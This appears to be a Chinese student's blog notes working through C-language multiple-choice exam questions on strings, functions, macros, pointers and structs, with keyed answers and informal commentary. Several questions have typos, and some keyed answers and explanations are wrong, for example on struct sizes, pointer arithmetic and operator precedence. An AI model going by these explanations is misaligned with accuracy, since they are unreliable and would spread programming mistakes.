<p>在给定的程序段中，字符数组 <code>str</code> 的长度为 80。而使用 <code>strcpy()</code> 函数将字符串 “hello” 复制到字符数组 <code>str</code> 中后，实际上只是将 “hello” 的内容复制到了 <code>str</code> 中，并且在最后添加了字符串的终止符 <code>\0</code>。所以，<code>strlen()</code> 函数在计算 <code>str</code> 的长度时，会在遇到终止符 <code>\0</code> 时停止计数。</p>
<p>因此，尽管 <code>str</code> 的长度为 80，但是实际上存储的字符串 “hello” 的长度为 5。所以，程序运行后调用 <code>strlen(str)</code> 函数将返回 5，而不是 80。</p>
<h2 id="24-1"><a href="#24-1" class="headerlink" title="24"></a>24</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24．以下程序段运行后屏幕输出为（ C ）</span><br><span class="line">char a[]=”abc\0mis”;</span><br><span class="line">printf(“%d”,srelen(a));</span><br><span class="line">Ａ．５　　   Ｂ．８　    Ｃ．３　　Ｄ．４</span><br></pre></td></tr></table></figure>

<p>这个题目都写错了把，str，这个选3，上面解释过了</p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.关于C语言函数的描述中，正确的是（ B ）</span><br><span class="line">A.函数的定义可以嵌套，但函数的调用不可以嵌套     </span><br><span class="line">B.函数的定义不可以嵌套，但函数的调用可以嵌套   </span><br><span class="line">C.函数的定义和函数的调用都可以嵌套    </span><br><span class="line">D. 函数的定义和函数的调用都不可以嵌套</span><br></pre></td></tr></table></figure>

<p>定义不可以嵌套，但是调用可以</p>
<h2 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.已知char a；使用scanf（）函数输入一个字符给变量a，不正确的函数调用是（ B ）</span><br><span class="line">A.scanf（“%d”，＆a）;     B.scanf（“%lf”，＆a）;   </span><br><span class="line">C.scanf（“%c，＆a）;      D.scanf（”%u”，＆a）;</span><br></pre></td></tr></table></figure>

<p>%u：用于打印无符号十进制整数。</p>
<p>b是float类型的，不可以。char在c语言中是按照整数类型存储</p>
<h2 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.putchar（）函数的功能是向终端输出（ B ）</span><br><span class="line">A.多个字符     B.一个字符</span><br><span class="line">C.一个实型变量值   D.一个整型变量表达式</span><br></pre></td></tr></table></figure>

<p>这个记住就好了</p>
<p>扩展一个<code>getchar()</code> 函数的功能是从标准输入（通常是终端）获取一个字符。</p>
<h2 id="4-5"><a href="#4-5" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、已知int a；使用scanf（）函数输入一个整数给变量a, 正确的函数调用是( B )</span><br><span class="line">A、scanf（“%d”, a）;     B、scanf（“%d”,＆a）; </span><br><span class="line">C、scanf(“A”, ＆a );    D、scanf(“%df”, ＆a );</span><br></pre></td></tr></table></figure>

<h2 id="5-5"><a href="#5-5" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.C语言的函数体由( B )括起来</span><br><span class="line">  A.( )      B.&#123;&#125;　　  Ｃ．［］   　Ｄ．／* *／</span><br></pre></td></tr></table></figure>

<p>这个就不多说了</p>
<h2 id="6-4"><a href="#6-4" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.如下fun函数的类型是（ C ）</span><br><span class="line">fun(float x)</span><br><span class="line">&#123;</span><br><span class="line">  double y;</span><br><span class="line">  int z;</span><br><span class="line">  y=x*x;</span><br><span class="line">  z=(int)y;</span><br><span class="line">  return(z);</span><br><span class="line">&#125;</span><br><span class="line">Ａ．void     B.double     C.int     D.float</span><br></pre></td></tr></table></figure>

<p>最后返回的数据是int。所以就是int类型啦</p>
<h2 id="7-4"><a href="#7-4" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.设有如下函数定义:</span><br><span class="line">int fun(char *str) </span><br><span class="line">&#123;</span><br><span class="line">char *p;p=str;</span><br><span class="line">if(p!=‘\0’) </span><br><span class="line">p++;</span><br><span class="line">return (p-str);</span><br><span class="line">&#125;</span><br><span class="line">则以下语句执行后的输出结果是( A )</span><br><span class="line">printf(“%d\n”,fun(“student”));</span><br><span class="line">A. 7         B. 8            C. 9      D. 10</span><br></pre></td></tr></table></figure>

<p>你妈妈的，编译都编译不了额额额额。</p>
<p>自己算算吧，大致就是定义了一坨指针，和一个变量。如果这个变量不是\0,那就给指针往后移一位，就是算了下这个字符串的长度。哪有这样算的啊？不是，真可以这样算吗？</p>
<h2 id="8-4"><a href="#8-4" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.以下程序的屏幕输出为(B)</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void f（int i）</span><br><span class="line">&#123;</span><br><span class="line">int a=2；</span><br><span class="line">a=i++；</span><br><span class="line">printf（“%d”，a）；</span><br><span class="line">&#125;</span><br><span class="line">main（）</span><br><span class="line">&#123;</span><br><span class="line">int a=1 ，c=3；</span><br><span class="line">f（c）；</span><br><span class="line">a=c++;</span><br><span class="line">printf（“%d”，a）；</span><br><span class="line">&#125;</span><br><span class="line">A. 4，3       B. 3，3      C.4，5      D. 3，5</span><br></pre></td></tr></table></figure>

<p>在 <code>f(c)</code> 调用中，传递给 <code>f()</code> 函数的参数是变量 <code>c</code> 的值，即 3。在函数内部，变量 <code>a</code> 被赋值为 2，并且 <code>i++</code> 表达式的值被赋给 <code>a</code>。这意味着 <code>a</code> 的值将是 <code>i</code> 在自增之前的值，即 3。所以 <code>printf</code> 语句会输出 <code>3</code>。</p>
<p>然后在 <code>a = c++</code> 语句中，变量 <code>c</code> 的值被赋值给变量 <code>a</code>，即 <code>a</code> 的值变为 3。在赋值完成之后，<code>c</code> 的值自增，变为 4。所以 <code>printf</code> 语句会输出 <code>3</code>。</p>
<h2 id="9-4"><a href="#9-4" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9.若有以下函数定义:</span><br><span class="line">int fun ()</span><br><span class="line">&#123;</span><br><span class="line">static int k=0;</span><br><span class="line">return ++k;</span><br><span class="line">&#125;</span><br><span class="line">以下程序段运行后屏幕输出为( D )</span><br><span class="line">int i; </span><br><span class="line">for (i=1;i＜=5 i++)</span><br><span class="line">    fun();</span><br><span class="line">printf(“%d”,fun());</span><br><span class="line">A.  0      B.   1      C.  5      D.  6</span><br></pre></td></tr></table></figure>

<p>分析一下这个函数的作用，定义了一个静态变量k</p>
<p>这里就需要注意静态变量的特性了，静态局部变量是在编译的时候赋初值。即只赋初值一次，不会随函数调用结束后其存储单元消失</p>
<p>然后执行了5+1次的fun函数，最后输出fun函数的返回值，函数里面是先加再输出的，所以选D</p>
<h2 id="10-4"><a href="#10-4" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.以下程序运行的结果是（ Ａ ）</span><br><span class="line">int fun (int array[4][4])</span><br><span class="line">&#123;</span><br><span class="line">int j;</span><br><span class="line">for(j=0;j＜4;j++)//神说这样会更占用资源，不入++j</span><br><span class="line">printf(“%2d”,array[2][j]);</span><br><span class="line">printf(“\n”);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">int a[4][4]=&#123;0,1,2,0,1,0,0,4,2,0,0,5,0,4,5,0&#125;;</span><br><span class="line">fun(a);</span><br><span class="line">&#125;</span><br><span class="line">A.2005       B.1004       C.0120        D.0450</span><br></pre></td></tr></table></figure>

<p>fun的函数效果就是，将输入的二维数组，的第3行一次输出，所以就是A</p>
<h2 id="11-4"><a href="#11-4" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11.以下程序运行后屏幕输出为（ D ）</span><br><span class="line">#include〈stdio.h〉</span><br><span class="line">int a=2 ，b=3；</span><br><span class="line">int max（int a，int b）</span><br><span class="line">&#123; </span><br><span class="line">int c；</span><br><span class="line">c=a＞b？a:b；</span><br><span class="line">return（c）；</span><br><span class="line">&#125;</span><br><span class="line">main（）</span><br><span class="line">&#123;</span><br><span class="line">int a=4；</span><br><span class="line">printf（“%d”，max（a，b））；</span><br><span class="line">&#125;</span><br><span class="line">A. 2，3      B.  2     C. 3    D.  4</span><br></pre></td></tr></table></figure>

<p>max函数的作用就是寻找两个数中的最大值，这个考的就是作用域把，肯定是选择4啊，不用说，因为前面的ab是在编译的时候定义的，然后你main函数又重新定义了一次a，肯定使用重新定义的。</p>
<h2 id="12-4"><a href="#12-4" class="headerlink" title="12"></a>12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12.以下程序运行后屏幕输出为( B )</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int f(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">  return(x+y);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  int a=2,b=3,c;</span><br><span class="line">  c=f(a,b);</span><br><span class="line">  printf(“%d+%d=%d\n”,a,b,c);</span><br><span class="line">&#125;</span><br><span class="line">A.0     B.2+3=5     C.2+3=0     D.3+2=5</span><br></pre></td></tr></table></figure>

<p>输出的是一个表达式，abc的值，a的值就是2，b是3，c是两个相加，就是5.所以选B</p>
<h2 id="13-4"><a href="#13-4" class="headerlink" title="13"></a>13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13、下面程序的输出结果是（ D ）</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int global=100;</span><br><span class="line">fun (  )</span><br><span class="line">&#123;</span><br><span class="line">int global=5;</span><br><span class="line">return ++global;</span><br><span class="line">&#125;</span><br><span class="line">void main(  )</span><br><span class="line">&#123;</span><br><span class="line">printf (“% d\n”, fun( ) )</span><br><span class="line">&#125;</span><br><span class="line">A、100    B、101   C、5   D、6</span><br></pre></td></tr></table></figure>

<p>然后这里又是考作用域的问题啊，定义了一个全局的global变量和一个fun内部的局部变量。我觉得函数内部肯定使用的就是函数内部的局部变量咯</p>
<p>我的博客也写了<code>在文件的某处引用重名变量时，所引用的变量就是作用域较小的那一个变量。</code></p>
<h1 id="预处理命令"><a href="#预处理命令" class="headerlink" title="预处理命令"></a>预处理命令</h1><h2 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.若有定义：#define PI 3，则表达式PI*2*2的值为（ A ）</span><br><span class="line">A.12      B.4</span><br><span class="line">C.3     D.不确定</span><br></pre></td></tr></table></figure>

<p>3*4就是十二</p>
<h2 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.设有如下定义typedef  int *INTEGER；INTEGER  P，*q；则（ C ）是正确的表述</span><br><span class="line">A.P是int型变量                 B .q是基类型为int的指针变量</span><br><span class="line">C.P是基类型为int的指针变量     D.程序中可用INTEGER代替int类型名。</span><br></pre></td></tr></table></figure>

<p>在这里，<code>INTEGER</code> 被定义为 <code>int *</code>，即指向整型的指针类型。</p>
<p>根据定义，<code>P</code> 是 <code>INTEGER</code> 类型的变量，即 <code>int *</code> 类型的变量。因此，P 是基类型为 int 的指针变量。</p>
<p>同样，<code>q</code> 也是 <code>INTEGER</code> 类型的变量，即 <code>int *</code> 类型的指针变量。因此，q 也是基类型为 int 的指针变量。</p>
<p>这道题有意思哈，我第一次看也选错了。<strong>需要着重复习！！</strong></p>
<h2 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、以下叙述中，正确的是（ A ）</span><br><span class="line">A、宏展开不占用运行时间，只占用编译时间</span><br><span class="line">B、预编译处理命令行必须以分号结束</span><br><span class="line">C、一个源程序只能有一个预编译处理命令行</span><br><span class="line">D、使用带参数的宏定义时，应该说明每个参数的数据类型</span><br></pre></td></tr></table></figure>

<p>A. 宏展开是在编译时期进行的，它会将宏定义的部分替换为相应的代码。因此，宏展开不会在运行时产生额外的开销，它只在编译期起作用，所以只会占用编译时间。</p>
<p>B. 预编译处理命令行以 <code>#</code> 字符开头，而不是以分号结束。</p>
<p>C. 一个源程序可以有多个预编译处理命令行，以插入包含文件、定义宏等。</p>
<p>D. 在使用带参数的宏定义时，不需要明确指定每个参数的数据类型。宏展开只是进行简单的文本替换，不像函数有参数的类型检查。</p>
<h2 id="4-6"><a href="#4-6" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、以下的叙述中不正确的是（ C ）</span><br><span class="line">A、宏展开不占用运行时间，只占用编译时间</span><br><span class="line">B、宏名无类型</span><br><span class="line">C、宏名必须用大写字母表示</span><br><span class="line">D、预处理命令行都必须以#号开始</span><br></pre></td></tr></table></figure>

<p>和上面那道题差不多</p>
<p>A. 宏展开是在编译时期进行的，它会将宏定义的部分替换为相应的代码。因此，宏展开不会在运行时产生额外的开销，它只在编译期起作用，所以只会占用编译时间。</p>
<p>B. 宏名没有类型，它只是一个标识符，用于标识宏定义的部分。</p>
<p>C. 宏名没有强制要求使用大写字母表示。宏名的命名规范与其他标识符一样，通常建议使用大写字母加下划线的形式，以提高可读性和与其他标识符的区分度。但并非必须使用大写字母。</p>
<p>D. 预处理命令行都必须以 <code>#</code> 号开始，以标识预处理命令，对于大多数预处理命令，确实需要以 <code>#</code> 号开始。例如，宏定义、包含文件等。</p>
<h2 id="5-6"><a href="#5-6" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5．以下叙述中，正确的是（ B ）</span><br><span class="line">Ａ．＂#define　PRICE＝３０＂定义了３０等价的符号常量PRICE</span><br><span class="line">Ｂ．预编译处理命令行都必须以＂#＂开头</span><br><span class="line">Ｃ．宏名只能是含大写字母和数字字符</span><br><span class="line">Ｄ．在程序的一行上可以书写几个有效的宏定义</span><br></pre></td></tr></table></figure>

<p>A. <code>#define PRICE=30</code> 定义的是 <code>PRICE=30</code> 这个宏，而不是 <code>30</code> 这个符号常量。在宏展开时，会将 <code>PRICE</code> 替换为 <code>30</code>，而不是直接将 <code>30</code> 视为符号常量。</p>
<p>B. 预处理处理命令行都必须以 <code>#</code> 开头，以标识预处理命令。预处理命令包括宏定义 <code>#define</code>、条件编译 <code>#if</code>、<code>#ifdef</code>、包含文件 <code>#include</code> 等。</p>
<p>C. 宏名可以包含大写字母、小写字母、数字和下划线。并无限制只能使用大写字母和数字字符。</p>
<p>D. 在一行上可以书写多个有效的宏定义，每个宏定义之间用分号或者换行符分隔。</p>
<p>这道题，我们只能当做D是错误的了，实际上D选项我写过程序，正常运行了的。</p>
<h2 id="6-5"><a href="#6-5" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.下面程序的输出结果是（C）</span><br><span class="line">#include〈stdio.h〉</span><br><span class="line">#define ONE 1 </span><br><span class="line">#define  TWO ONE+1  </span><br><span class="line">#define THREE TWO+1</span><br><span class="line">void main （）</span><br><span class="line">&#123;</span><br><span class="line">printf（“%d\n”,THREE-ONE）;</span><br><span class="line">&#125;</span><br><span class="line">A.产生错误,     B.  1        C.   2      D.   3</span><br></pre></td></tr></table></figure>

<p>3-1等于2嘛</p>
<p>根据宏定义展开的原理，宏的展开是简单的文本替换。在给定的代码中：</p>
<p>首先，宏 ONE 被定义为 1，所以 TWO 直接进行宏展开就是 <code>ONE+1</code>，即 <code>1+1</code>。</p>
<p>然后，宏 THREE 直接进行宏展开就是 <code>TWO+1</code>，即 <code>(ONE+1)+1</code>，这里 ONE 视为字面值常量。</p>
<p>最后，在 <code>printf()</code> 函数中，<code>THREE-ONE</code> 进行宏展开就是 <code>((ONE+1)+1)-ONE</code>，即 <code>(1+1+1)-1</code>，结果为 2。</p>
<h2 id="7-5"><a href="#7-5" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.以下程序执行时,输入1 2 3 4 5&lt;回车&gt;输出为( A )</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#define N 5</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int a[N];</span><br><span class="line">  int *p=a;</span><br><span class="line">  while(p&lt;a+N)</span><br><span class="line">     scanf(“%d”,p++);</span><br><span class="line">  while(p&gt;a)</span><br><span class="line">     prinf(“%s”,*(--p));</span><br><span class="line">&#125;</span><br><span class="line">A.5 4 3 2 1      B.1 2 3 4 5     C.2 3 4 5 1      D.4 3 2 1 5</span><br></pre></td></tr></table></figure>

<p>第一个while就是比较两个是指针的大小，因为指针p是指向的a数组的首地址，一直加到a+N停止，也就是说比a数组最大的还多了个地址，正好让p停留在a数组的最后一个元素的位置。</p>
<p>所以第一个while就是给a数组依次赋值，后面的while就是让while从最后开始输出，（这些b题放在编译器都要报错的，也不知道是谁写的。）</p>
<p>所以就是倒着输出54321</p>
<h2 id="8-5"><a href="#8-5" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.若有以下定义</span><br><span class="line">#define MOD(x,y) x%y</span><br><span class="line">则执行以下程序段后,z的值是( D )</span><br><span class="line">int z,a=15,b=100;</span><br><span class="line">z=MOD(b,a);</span><br><span class="line">A.100,     B.15       C.11     D.10</span><br></pre></td></tr></table></figure>

<p>根据给定的宏定义 <code>#define MOD(x,y) x%y</code>，宏展开后 <code>z=MOD(b,a)</code> 变成 <code>z=b%a</code>。</p>
<p>所以，<code>z</code> 的值是 100 % 15，结果为 10。因此，选项 D 正确。</p>
<h2 id="9-5"><a href="#9-5" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9、下面程序的输出结果是（ A ）</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#define SQR(x) (x*x)</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int a,b=3;</span><br><span class="line">  a=SQR(b+2);</span><br><span class="line">  printf(“\n%d”,a);</span><br><span class="line">&#125;</span><br><span class="line">A．11		B．25		C．不定值		D．产生错误</span><br></pre></td></tr></table></figure>

<p><strong>这道题需要注意了！！！！！！</strong>，这个define只是最基础的文本替换，</p>
<p>所以我们这个替换之后是这样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a,b=<span class="number">3</span>;</span><br><span class="line">  a=(b+<span class="number">2</span>*b+<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(“\n%d”,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自然输出的就是11了！！！！</p>
<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><h2 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.若函数fun的函数头为：int  fun（int i，int j）且函数指针变量P定义如下：int （*P）（int i，int j）；则要使指针P指向函数fun的赋值语句是（ B ）</span><br><span class="line">A. P=*fun      B. P=fun；</span><br><span class="line">C. P=fun（i，j）     D. P=＆fun</span><br></pre></td></tr></table></figure>

<p><code>int (*P)(int i, int j)</code> 表示 <code>P</code> 是一个指向具有两个 <code>int</code> 类型参数和一个 <code>int</code> 类型返回值的函数的指针。</p>
<p>这个确实比较难理解哈，但是答案就是选B，这句解析好好看一下。</p>
<h2 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.设有以下语句，则（ D ）是对数组元素的不正确引用，其中.int a[10]=&#123;0,1,2,3,4,5,6,7,8,9&#125;,*p=a</span><br><span class="line">A．a[p-a]		B．*(&amp;a[i])</span><br><span class="line">C．p[i]		D．*(*(a+i)) </span><br></pre></td></tr></table></figure>

<p>a啊啊啊啊啊啊我要疯掉了，首先C肯定是对的</p>
<p><code>a</code> 是一个数组名，代表数组的首地址，因此 <code>a</code> 的值为 <code>&amp;a[0]</code>。</p>
<p><code>p</code> 是一个指针变量，指向数组 <code>a</code> 的首地址，即 <code>&amp;a[0]</code>。</p>
<p>然后第一个是p-a是地址差值，而p就是指向的a的第一个元素， 所以相减是0，然后就相当于是a[0]</p>
<p>第二个呢，<code>&amp;a[i]</code>指的是a的i的元素的地址，而*又是指向这个地址，所以是正确的</p>
<p>最后一个，a+i，指向他一个就够了。</p>
<p><code>*(*(a+i))</code>：这是一个不正确的引用。在这种语法中，我们尝试将数组 <code>a</code> 视为一个二维数组，并通过 <code>*(*(a+i))</code> 来访问其中的元素。但是，事实上，数组 <code>a</code> 是一个一维数组，这样的引用是不正确的。</p>
<h2 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、在16位编译系统上，若有定义int a [ ]=&#123;10，20，30&#125;，*p=＆a；当执行p++；后下列叙述错误的是（ A ）</span><br><span class="line">A、p向高地址移了一个字节</span><br><span class="line">B、p与a+1等价</span><br><span class="line">C、语句printf(“%d”, p)；输出20</span><br><span class="line">D、p指向数组元素a[1]</span><br></pre></td></tr></table></figure>

<p>后面三个我都能理解，这个a是什么意思？</p>
<p>A. <code>p</code> 向高地址移了一个字节：这个叙述是错误的。在16位编译系统中，指针的大小是2个字节（16位），而不是1个字节。因此，执行 <code>p++</code> 操作后，<code>p</code> 移动的是2个字节的大小，而不是1个字节。所以，叙述 A 是错误的。</p>
<p>酱紫啊。。</p>
<p>在C语言中，指针的大小是由编译系统的位数决定的。一般而言，32位编译系统中指针的大小是4个字节（32位），64位编译系统中指针的大小是8个字节（64位）。</p>
<h2 id="4-7"><a href="#4-7" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、以下程序段运行后*（++p）的值为（C）</span><br><span class="line">   char a[6]=“work”;</span><br><span class="line">   char *p;</span><br><span class="line">   p=a;</span><br><span class="line">A、‘w’   B、存放‘w’的地址    C、‘O’   D、存放的‘O’地址</span><br></pre></td></tr></table></figure>

<p>这个就不说了把，++p是指向那个地方的地址，*就引用了他。</p>
<h2 id="5-7"><a href="#5-7" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.在16位编译系统上,若有定义int a[]=&#123;10,20,30&#125;,*p=&amp;a;当执行p++;后下列叙述错误的是( A )</span><br><span class="line">A.p向高地址移了一个字节         B.p与a+1等价</span><br><span class="line">C.语句printf(“%d”,*p);输出20;    D.p指向数组元素a[1] </span><br></pre></td></tr></table></figure>

<p>这个不收了好吧不就是上面那个题吗</p>
<h2 id="6-6"><a href="#6-6" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.以下程序运行后*（P+3）的值为（ A ）</span><br><span class="line">char a[]=“good”； char *P；P=a；</span><br><span class="line">A.‘d’       B.‘\0’</span><br><span class="line">C.存放‘d’的地址      D.‘0’</span><br></pre></td></tr></table></figure>

<p>一样的啊*引用了d的地址，所以输出d</p>
<h2 id="7-6"><a href="#7-6" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7.以下程序运行后x的值为(D)</span><br><span class="line">int a[9]=&#123;1,2,3,4,5,6,7,8,9&#125;;</span><br><span class="line">int *p,*q;</span><br><span class="line">int i,x;</span><br><span class="line">p=＆a[0];</span><br><span class="line">q=＆a[8];</span><br><span class="line">for (i=O;i＜3;i++)</span><br><span class="line">if(*(p+i)==*(q-i) )</span><br><span class="line">x=*(p+i)*2;</span><br><span class="line">A. 2       B.  4</span><br><span class="line">C. 6      D.不确定</span><br></pre></td></tr></table></figure>

<p>for循环三次，然后并没有找到一样的数，所以x没有被赋值。</p>
<ul>
<li>当 <code>i = 0</code> 时，<code>*(p+i) = *(p+0) = *p = 1</code>，<code>*(q-i) = *(q-0) = *q = 9</code>。因此，条件不满足，进入下一次迭代。</li>
<li>当 <code>i = 1</code> 时，<code>*(p+i) = *(p+1) = *(p+1) = 2</code>，<code>*(q-i) = *(q-1) = *(q-1) = 8</code>。因此，条件不满足，进入下一次迭代。</li>
<li>当 <code>i = 2</code> 时，<code>*(p+i) = *(p+2) = *(p+2) = 3</code>，<code>*(q-i) = *(q-2) = *(q-2) = 7</code>。因此，条件不满足，循环结束。</li>
</ul>
<h2 id="8-6"><a href="#8-6" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.以下程序运行段运行后x的值为( D )</span><br><span class="line">int a[]=&#123;1,2,3,4,5,6,7,8&#125;;</span><br><span class="line">int i,x *p; </span><br><span class="line">x=1;</span><br><span class="line">p=＆a[2];</span><br><span class="line">for(i=0,i＜3,i++)</span><br><span class="line">x*=(p+i);</span><br><span class="line">A. 不确定       B.  24       C.  120     D.  60</span><br></pre></td></tr></table></figure>

<p>x为1，p指向a的第三个元素，for循环三次。</p>
<p>x乘以p+0的元素，第一次是3，第二次是，12，第三次是，60</p>
<p>值得注意的是，代码是错的哈，应该是<code>x *= *(p + i);</code></p>
<h2 id="9-6"><a href="#9-6" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10．执行以下程序段的输出结果是（ B ）</span><br><span class="line">int a=10,*p=&amp;a;</span><br><span class="line">printf(“%d”,++*p);</span><br><span class="line">A．１０　　 Ｂ．１１</span><br><span class="line">Ｃ．变量a的地址　  Ｄ．变量a的地址加１</span><br></pre></td></tr></table></figure>

<p>*p的值是10哈，加一个就是11</p>
<p>根据运算符优先级，前缀递增运算符 <code>++</code> 具有比间接解引用运算符 <code>*</code> 更高的优先级，因此 <code>++*p</code> 将先递增 <code>*p</code> 所指向的值，然后取得递增后的值。</p>
<h1 id="结构体与共用体"><a href="#结构体与共用体" class="headerlink" title="结构体与共用体"></a><strong>结构体与共用体</strong></h1><h2 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.设有以下定义语句：</span><br><span class="line">struct student&#123;</span><br><span class="line">int num；</span><br><span class="line">char name[10]；</span><br><span class="line">float score;</span><br><span class="line">&#125;wang，zhang；的变量wang所占的内存字节是（ B ）</span><br><span class="line">A.14        B.16.         C.18        D.9</span><br></pre></td></tr></table></figure>

<p>关于结构体：</p>
<p>1.结构体变量的首地址能够被其最宽基本类型成员的大小所整除。</p>
<p>2.结构体成员相对于结构体变量的首地址的偏移量（结构体变量的首地址编号和结构体成员的地址编号他们之间所差的字节数）都是其成员大小的整数倍</p>
<p>3.结构体的总大小为结构最宽基本类型成员的整数倍</p>
<p>这里最宽的基本类型是float，4个字节，所以一定会被4整除</p>
<h2 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.设有以下定义语句:</span><br><span class="line">struct student&#123;</span><br><span class="line">int num ;</span><br><span class="line">char name[10];</span><br><span class="line">float score;&#125;wang,zhang;</span><br><span class="line">则不正确的叙述是( C )</span><br><span class="line">A.struct 是结构体类型的关键字   B.zhang是结构体变量名</span><br><span class="line">C.wang是结构体类型名           D.num,name,score都是结构体类型student的成员名</span><br></pre></td></tr></table></figure>

<p>结构体类型名为 <code>student</code>，而 <code>wang</code> 和 <code>zhang</code> 是具体的结构体变量名。</p>
<h2 id="3-8"><a href="#3-8" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.若struct teacher&#123;</span><br><span class="line">int num；</span><br><span class="line">char name[10]；</span><br><span class="line">char sex；</span><br><span class="line">int age； </span><br><span class="line">float score；&#125;teacher1；</span><br><span class="line">则变量teacher1所占用的内存字节是（ C ）</span><br><span class="line">A.5        B.14       C.19.      D.20</span><br></pre></td></tr></table></figure>

<p>1、找到结构体中最大的成员变量所占的字节数</p>
<p>2、结构体中成员变量的起始地址为该成员变量大小的整数倍（一般情况下我们认为第一个成员变量的起始地址为0）</p>
<p>3、<a href="https://so.csdn.net/so/search?q=%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">结构体变量</a>的总大小必须要是结构体中最大变量字节的整数倍（不足补齐）</p>
<p>答案是24个字节，我运行了程序的，分析一下。int，就是四个字节，0+4，1可以从4开始存，所以4+11=15，int是4，需要从16开始存，所以16+4，float是4，可以从20开始，所以是24.</p>
<h2 id="4-8"><a href="#4-8" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.、假定已有如下变量说明和枚举定义：</span><br><span class="line">char ch;</span><br><span class="line">int j,k;</span><br><span class="line">enum day&#123;sum,mon,tue,wed,thu,fri,sat&#125;;</span><br><span class="line">int a[sat];</span><br><span class="line">判定下列语句是否符合语法规则，结果是（ C ）</span><br><span class="line">char a;                  /*语句1*/</span><br><span class="line">j+k=j;                   /*语句2*/</span><br><span class="line">if（a[mon]&gt;0） j++;      /*语句3*/</span><br><span class="line">A．语句2错误，其它正确		B．语句1正确，其它错误</span><br><span class="line">C．语句3正确，其它错误		D．语句错误，其它正确</span><br></pre></td></tr></table></figure>

